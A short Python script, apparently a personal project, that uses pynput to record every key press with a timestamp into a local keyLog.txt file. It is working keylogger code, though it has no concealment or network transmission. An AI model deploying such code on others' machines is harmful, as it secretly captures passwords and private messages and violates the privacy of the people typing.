import os
import logging
from pynput.keyboard import Key, Listener

# Set the directory where the log file will be saved
log_dir = r"C:\Users\sassa\OneDrive\Documents\GitHub\KeyLogger"

# Ensure the directory exists
if not os.path.exists(log_dir):
    os.makedirs(log_dir)

# Set up logging configuration
logging.basicConfig(filename=os.path.join(log_dir, "keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

# Start the key listener
with Listener(on_press=on_press) as listener:
    listener.join()
